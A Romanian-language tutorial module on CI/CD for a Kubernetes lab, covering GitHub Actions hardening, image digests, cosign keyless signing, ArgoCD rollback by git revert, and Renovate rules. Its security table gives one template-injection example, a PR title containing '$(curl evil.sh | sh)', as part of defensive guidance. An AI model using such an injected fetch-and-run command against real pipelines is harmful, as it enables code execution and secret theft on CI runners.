# CI/CD: GitHub Actions, imagini, Renovate

Ultima piesă a buclei: o schimbare de cod devine un pod, fără ca cineva să atingă
clusterul. CI-ul testează, construiește, semnează și scrie un commit; ArgoCD face restul.
Iar Renovate ține tot ce e fixat — versiuni, imagini, acțiuni — la zi, prin aceleași PR-uri.

## Cine face ce

```mermaid
flowchart LR
  DEV[git push<br/>src/lab-app] --> CI[GitHub Actions<br/>test → build → push → sign]
  CI --> REG[(ghcr.io<br/>lab-app@sha256:…)]
  CI -- "commit: images.digest" --> GIT[(k8s-lab main)]
  GIT --> ARGO[ArgoCD<br/>în cluster]
  REG --> ARGO
  ARGO --> POD[pod-uri noi<br/>rolling update]
  REN[Renovate] -- PR-uri --> GIT
```

| | CI | CD clasic (push) | CD prin GitOps (pull) |
|---|---|---|---|
| Ce face | testează, construiește artefacte | CI rulează `kubectl apply`/`helm upgrade` | CI scrie în Git; agentul din cluster aplică |
| Credențiale de cluster în CI | nu | **da** | nu |
| Rollback | — | rulezi din nou pipeline-ul vechi | `git revert` |
| În prod | flux-local, flate | — | Flux |

## Anatomia unui workflow

```yaml
name: lab-app
on:                          # ce îl pornește
  push: {branches: [main], paths: ["src/lab-app/**"]}
  pull_request: {paths: ["src/lab-app/**"]}
permissions: {}              # nimic implicit — fiecare job cere ce folosește
concurrency: {group: lab-app-${{ github.ref }}, cancel-in-progress: false}
jobs:
  test:
    runs-on: ubuntu-latest   # un VM nou, șters la final
    permissions: {contents: read}
    steps:
      - uses: actions/checkout@<sha> # v7.0.1
      - run: go test ./...
  image:
    needs: test              # ordine + acces la outputs
    outputs: {digest: ${{ steps.build.outputs.digest }}}
```

Citește cele două workflow-uri ale lab-ului:
[validate.yaml](../lab/k8s-lab/.github/workflows/validate.yaml) (randează fiecare
Application ca ArgoCD și validează cu kubeconform — echivalentul flux-local) și
[lab-app.yaml](../lab/k8s-lab/.github/workflows/lab-app.yaml) (test → imagine → semnare →
deploy). Și pe cele din prod: [flux-local.yaml](../../.github/workflows/flux-local.yaml)
face, pe fiecare PR, `test` (randează tot) și `diff` (ce s-ar schimba față de `main`,
postat ca comentariu în PR).

## Securitatea pipeline-ului

CI-ul are acces la cod, la registry și — prin `GITHUB_TOKEN` — la repo. E o țintă.

| Regulă | De ce | În prod |
|---|---|---|
| `permissions: {}` la nivel de workflow, apoi per job | un pas compromis are doar drepturile jobului lui | toate workflow-urile |
| Acțiuni fixate pe **SHA**, nu pe tag | un tag se poate muta; un SHA nu. În martie 2025, `tj-actions/changed-files` a fost compromis și tag-urile lui mutate pe cod care furia secrete | `tj-actions/changed-files@9426d4…`, `helpers:pinGitHubActionDigests` |
| `persist-credentials: false` la checkout | altfel tokenul rămâne în `.git/config`, la îndemâna oricărui pas ulterior | checkout-urile din prod |
| Niciun `${{ … }}` cu date externe direct în `run:` | titlul unui PR poate conține `$(curl evil.sh \| sh)` — *template injection* | se trec prin `env:` |
| `pull_request_target` doar fără checkout-ul codului din PR | rulează cu secretele repo-ului principal | [labeler.yaml](../../.github/workflows/labeler.yaml): doar etichetează |
| Linter de securitate | prinde toate cele de mai sus | **zizmor** în [.lefthook.toml](../../.lefthook.toml), pre-commit |

> [!WARNING]
> **⚠️ Șablonul lab-ului nu respectă încă rândul 2**
> `actions/checkout` e fixat pe SHA (același ca în prod), dar `setup-go`, acțiunile
> `docker/*` și `cosign-installer` sunt pe tag-uri. Intenționat: primul task e să le fixezi
> tu. Rulează și `zizmor .github/workflows/` înainte și după — vezi ce raportează.

```bash
# SHA-ul commit-ului din spatele unui tag:
gh api repos/actions/setup-go/commits/v5 --jq .sha
# → actions/setup-go@<sha> # v5
```

## Imaginea: tag, digest, semnătură

| Referință | Exemplu | Se poate schimba? |
|---|---|---|
| tag | `ghcr.io/meroxdotdev/lab-app:latest` | da, oricând, de oricine poate împinge |
| tag imuabil prin convenție | `:sha-3f2a1c9` | tehnic da |
| **digest** | `@sha256:9b1f…` | **nu** — e hash-ul conținutului |

CI-ul scrie **digest-ul** în `apps/lab-app/kustomization.yaml`. ArgoCD deployează exact
octeții care au fost testați și semnați. Prod face la fel la imaginile aplicațiilor:
`tag: 6.4.4.10685@sha256:1902ad…` în [helmrelease-ul Radarr](../../kubernetes/apps/default/radarr/app/helmrelease.yaml)
— tag-ul pentru oameni, digest-ul pentru mașini; Renovate le actualizează pe amândouă.

**Semnarea fără chei** (*keyless*, cu cosign/Sigstore): jobul primește de la GitHub un token
OIDC care spune „sunt workflow-ul `lab-app.yaml` din `meroxdotdev/k8s-lab`, pe `main`”.
Sigstore emite pe baza lui un certificat valabil 10 minute, cosign semnează digest-ul, iar
semnătura e înregistrată într-un jurnal public (Rekor). Nu există nicio cheie privată de
păstrat sau de furat. Verificarea:

```bash
cosign verify ghcr.io/meroxdotdev/lab-app@sha256:<digest> \
  --certificate-identity-regexp '^https://github.com/meroxdotdev/k8s-lab/\.github/workflows/lab-app\.yaml@' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

> [!TIP]
> **🧠 Analogie: sigiliul de la farmacie**
> Digest-ul e codul unic de pe cutie: îți spune că e *exact* cutia asta, nu una care
> arată la fel. Semnătura e sigiliul producătorului: îți spune *cine* a ambalat-o. Un tag
> (`latest`) e eticheta de pe raft — utilă ca să găsești produsul, inutilă ca garanție.

## Laborator — de la `git push` la pod

CI-ul a rulat deja o dată: la primul push al repo-ului (modulul 12) a construit imaginea, dar
pasul de deploy a ieșit cu o notiță — `apps/lab-app` nu exista încă.

```bash
# 1. Pachetul din GHCR e privat implicit. GitHub → profilul tău → Packages → lab-app
#    → Package settings → Change visibility → Public. (Altfel: ImagePullBackOff.)

# 2. Aplicația intră în ApplicationSet:
cd ~/k8s-lab
git mv apps-later/lab-app apps/lab-app
git commit -m "feat(lab-app): deploy" && git push
argocd app wait lab-app --health
curl -s https://app.lab.merox.dev | jq      # din PC; sau de pe lab-gw cu --resolve

# 3. O schimbare de cod:
sed -i 's/salut din lab/salut din CI/' src/lab-app/main.go
git commit -am "feat(lab-app): new default message" && git push
gh run watch                                # test → image → deploy
git pull                                    # commit-ul bot-ului: „chore(lab-app): deploy …”
argocd app get lab-app --refresh
kubectl -n lab-app rollout status deploy/lab-app
```

`MESSAGE` vine din ConfigMap, deci textul nu se schimbă — dar `version` din răspuns da.
De ce? (Răspunsul e în [main.go](../lab/k8s-lab/src/lab-app/main.go) și în `-ldflags`.)

**Rollback-ul este un revert.** Fă întâi încă o schimbare de cod, ca să ai două deploy-uri
cu digest (A, apoi B). Apoi:

```bash
git pull                                    # HEAD = commit-ul bot-ului cu digest-ul B
git revert --no-edit HEAD && git push       # manifestul revine la digest-ul A
kubectl -n lab-app get pods -w              # pod-urile revin la imaginea A
```

De ce nu revert la *primul* commit al bot-ului? Pentru că înaintea lui manifestul spunea
`newTag: latest` — iar `latest` arată acum spre cea mai nouă imagine. „Rollback-ul” ar
redeploya exact versiunea de care fugi. Asta e, într-un singur exemplu, tot argumentul
împotriva tag-urilor mobile.

**Un PR stricat.** Pe o ramură, pune `replicas: "trei"` în `apps/whoami/deployment.yaml`,
deschide un PR și uită-te cum `validate` pică înainte ca ceva să ajungă în cluster. Asta e
valoarea CI-ului pentru manifeste: greșeala e prinsă în PR, nu în producție.

**Zero downtime.** În timpul unui deploy, de pe lab-gw:

```bash
while true; do curl -s -o /dev/null -w '%{http_code} ' --resolve app.lab.merox.dev:443:10.10.100.10 -k https://app.lab.merox.dev/; sleep 0.2; done
```

Nicio eroare, datorită a trei lucruri care lucrează împreună: `maxUnavailable: 0`, readiness
probe și oprirea grațioasă cu `SHUTDOWN_DELAY` (modulul 09). Pune `SHUTDOWN_DELAY=0s` în
ConfigMap și repetă: vezi câteva `502`?

## Renovate

Renovate citește repo-ul cu *manageri* (Helm, Kubernetes, ArgoCD, GitHub Actions, regex…),
găsește fiecare dependență fixată, întreabă *datasource*-ul ei (Docker Hub, GitHub releases,
un repo Helm) dacă există ceva mai nou și deschide un PR. Un *Dependency Dashboard* (un issue)
arată tot ce e în așteptare.

### Configurația prod, regulă cu regulă

Deschide [.renovaterc.json5](../../.renovaterc.json5) — fiecare `description` e o lecție:

| Regulă | Ce face | Povestea |
|---|---|---|
| `groupName: "talos"` pe `talenv.yaml` | Talos și Kubernetes într-un singur PR | versiunea Talos decide ce Kubernetes poate rula; două PR-uri separate ascund asta |
| `dependencyDashboardApproval` pentru minor/major în `talenv.yaml` | PR-ul apare doar după bifă în dashboard | kubelet 1.37 a fost merge-uit nebifat, pe un Talos care se oprea la 1.36 |
| `allowedVersions: "<1.37.0"` pe kubelet | un plafon dur | aprobarea „nu e o poartă”: a trecut a doua oară, ascunsă într-un PR grupat. „When a pair is invalid, the honest setting is a constraint, not a question.” |
| automerge pentru GitHub Actions, după 3 zile | patch-uri fără efort, dar nu în prima zi | 3 zile = timp ca un release compromis să fie retras |
| `customManagers` regex `# renovate: datasource=…` | urmărește versiuni din scripturi și YAML-uri oarecare | ce face `versions.env` din lab să fie urmărit |
| `ignorePaths` | ce nu e scanat | include acum `learn/lab/k8s-lab/**` — șablonul are propriul Renovate |

### Laborator Renovate

1. Instalează [Renovate GitHub App](https://github.com/apps/renovate) doar pe `k8s-lab`.
2. Configurația e deja acolo: [.renovaterc.json5](../lab/k8s-lab/.renovaterc.json5). Observă
   managerul `argocd` — Flux nu-l are, prod nu are nevoie de el.
3. Așteaptă primul run (sau declanșează-l din dashboard) și citește issue-ul *Dependency Dashboard*.
4. Merge-uiește un PR de patch și urmărește-l până în cluster: Renovate → PR → `validate` → merge → ArgoCD.
5. Scrie o regulă proprie: Kubernetes și Cilium în lab trebuie să rămână compatibile. Adaugă
   un `allowedVersions` pe care să-l poți justifica într-un `description`, în stilul prod.

## Taskuri

- [ ] Rulează `zizmor` pe workflow-urile k8s-lab; notează ce raportează
- [ ] Fixează pe SHA toate acțiunile din `lab-app.yaml` și `validate.yaml`; `zizmor` din nou
- [ ] Rulează local `bash scripts/validate.sh`; explică ce randează pentru fiecare Application
- [ ] Fă pachetul GHCR public și mută `apps-later/lab-app` în `apps/`
- [ ] O schimbare de cod ajunge în cluster doar prin `git push`; găsește commit-ul bot-ului
- [ ] Explică de ce textul nu s-a schimbat, dar `version` da
- [ ] Rollback cu `git revert`
- [ ] Un PR cu un manifest invalid pică la `validate`
- [ ] Verifică semnătura imaginii cu `cosign verify`; apoi încearcă cu un `--certificate-identity-regexp` greșit
- [ ] Bucla de `curl` arată zero erori la un deploy; cu `SHUTDOWN_DELAY=0s`, vezi dacă apar
- [ ] Instalează Renovate pe k8s-lab și merge-uiește un PR de patch până în cluster
- [ ] Scrie o regulă Renovate proprie, cu `description` în stilul prod
- [ ] Adaugă `servicemonitor.yaml` în kustomization-ul lab-app; `lab_app_requests_total` apare în Prometheus

## Întrebări de verificare

<details>
<summary>Commit-ul făcut de bot cu `GITHUB_TOKEN` nu declanșează din nou workflow-ul. De ce e asta o protecție, și când e o problemă?</summary>

GitHub nu pornește workflow-uri din evenimente create de `GITHUB_TOKEN`, ca un workflow să
nu se poată declanșa singur la nesfârșit. Aici e exact ce vrei: commit-ul de deploy nu
reconstruiește imaginea. Devine o problemă când vrei ca acel commit să treacă prin
`validate` (de exemplu, dacă deploy-ul ar deschide un PR): atunci ai nevoie de un token de
GitHub App sau un PAT — cu drepturi mai mari, deci cu mai multă grijă.
</details>

<details>
<summary>De ce digest în manifest, și nu `sha-3f2a1c9`?</summary>

Un tag, oricât de specific, e un pointer pe care cine are drept de push îl poate muta. Un
digest e hash-ul conținutului: dacă octeții diferă, digest-ul diferă. Cu digest-ul, ce
rulează în cluster e garantat ce a fost testat și semnat, iar `cosign verify` pe digest
are sens. Și containerd nu mai trebuie să întrebe registry-ul „ce e acum sub tag-ul ăsta?”.
</details>

<details>
<summary>Prod a pus și aprobare manuală, și un plafon `allowedVersions` pe același kubelet. De ce n-a ajuns aprobarea?</summary>

Pentru că aprobarea e o întrebare pusă unui om, iar oamenii aprobă ce arată familiar. A doua
oară, kubelet-ul nepermis a venit grupat în PR-ul `talos`, alături de un patch Talos
neînsemnat, și arăta ca orice bump. O pereche de versiuni *invalidă* nu e o chestiune de
judecată: trebuie să fie imposibilă, nu descurajată. Plafonul face asta.
</details>
